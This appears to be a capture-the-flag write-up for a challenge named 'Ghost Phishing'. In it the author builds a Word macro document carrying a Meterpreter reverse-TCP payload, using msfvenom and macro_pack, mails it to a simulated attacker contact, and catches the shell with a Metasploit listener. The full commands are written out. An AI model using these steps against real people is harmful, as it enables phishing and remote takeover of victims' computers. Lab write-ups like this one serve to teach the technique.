**Ghost Phishing**

For this You are given access to an email of specter@darknetmail.corp on the internal network of attackers, where you have direct communication with Cipher.

There was very little functionality on the email server, except for one email in the inbox from Cipher asking for a full report of our current operations.
![image](https://github.com/user-attachments/assets/f08282ea-8c32-49fd-89d2-df471cc83a87)

I decided to send a test email, to which Cipher responded with "send an attachment"
my next email I sent a .txt file with no content in it

![image](https://github.com/user-attachments/assets/ef433804-be60-4ecb-a7b0-e5a469d5e50a)


the above response lead me to believe this will be solved with either A. giving Cipher a report to trigger a different response or B. the most likely, I need to craft a word document and embed a VBA with a reverse shell.

I've tried many different ways on my local ParrotOS to create a .docm with a malicious macro, but they all seemed to fail, after some thinking I decided to bite the bullet and setup a VM with a windows 11 environment so i can use a tool called macro_pack 
https://github.com/sevagas/macro_pack

First I created a payload on my Local machine using msfvenom with following
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.2 LPORT=6656 -f vba > file.vba

Next I needed to move it across to my windows VM, since both are on the same network I decided to host python3 uploadserver so I can retrieve the malicious file back to my local VM and upload to cipher

python3 -m uploadserver 8001
Back on the windows VM i downloaded the file and using macro_pack I injected it with malicious vba to a docm using below
macro_pack.exe -f file.vba -o -G x6466.docm

![image](https://github.com/user-attachments/assets/fc1daf27-4856-4f2c-b2a7-0a3e34f6a896)


next back to upload server and I sent it back to my ParrotOS.
lastly setup your listener on Meterpreter
msfconsole
use multi/handler
set LHOST tun0
set LPORT 6656
run

After uploading the malicious file to cipher, after a minute i received my shell

![image](https://github.com/user-attachments/assets/1bd846ee-edd2-4170-b528-eb9780ff2fbc)

